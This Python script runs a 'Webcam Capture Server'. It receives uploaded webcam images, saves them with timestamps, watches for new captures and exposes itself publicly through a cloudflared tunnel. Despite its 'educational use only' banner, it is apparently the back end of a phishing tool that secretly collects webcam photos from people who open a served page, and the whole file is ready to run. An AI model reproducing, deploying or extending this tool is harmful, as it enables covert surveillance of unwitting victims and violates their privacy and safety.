from http.server import HTTPServer, SimpleHTTPRequestHandler
import cgi
import os
from datetime import datetime
import subprocess
import time
import threading

class CamHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            if 'webcam' in form:
                file_item = form['webcam']
                if file_item.filename:
                    # Ensure captured directory exists
                    os.makedirs("captured", exist_ok=True)
                    
                    # Save with timestamp
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = os.path.join("captured", f"captured_{timestamp}.jpg")
                    
                    with open(filename, "wb") as f:
                        f.write(file_item.file.read())
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"Image uploaded successfully")
                    print(f"[+] Captured image saved as: {filename}")
                    return
        
        self.send_response(400)
        self.end_headers()
        self.wfile.write(b"Invalid request")

def start_cloudflared():
    try:
        print("\n[*] Starting Cloudflare tunnel...")
        subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:8080"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Cloudflared error: {e}")
    except FileNotFoundError:
        print("[!] Cloudflared not found. Please install it first.")

def monitor_captures():
    print("\n[*] Monitoring for captured images...")
    initial_files = set(os.listdir("captured")) if os.path.exists("captured") else set()
    
    while True:
        current_files = set(os.listdir("captured")) if os.path.exists("captured") else set()
        new_files = current_files - initial_files
        
        for file in new_files:
            print(f"[+] New capture: captured/{file}")
        
        initial_files = current_files
        time.sleep(2)

from colorama import Fore, init
init()  # Initialize colorama

if __name__ == "__main__":
    print(Fore.RED + """
    ########################################################
    # Webcam Capture Server - Educational Use Only                    #
    # WARNING: Unauthorized access to devices is illegal  	       #
    # This is for security research/education only                             #
    ########################################################
    """ + Fore.RESET)
    
    # Create directories if they don't exist
    os.makedirs("captured", exist_ok=True)
    
    # Start monitoring thread
    threading.Thread(target=monitor_captures, daemon=True).start()
    
    # Start Cloudflare tunnel in separate thread
    cloudflared_thread = threading.Thread(target=start_cloudflared, daemon=True)
    cloudflared_thread.start()
    
    # Start HTTP server
    print("\n[*] Starting web server at http://localhost:8080")
    server = HTTPServer(('localhost', 8080), CamHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        server.server_close()
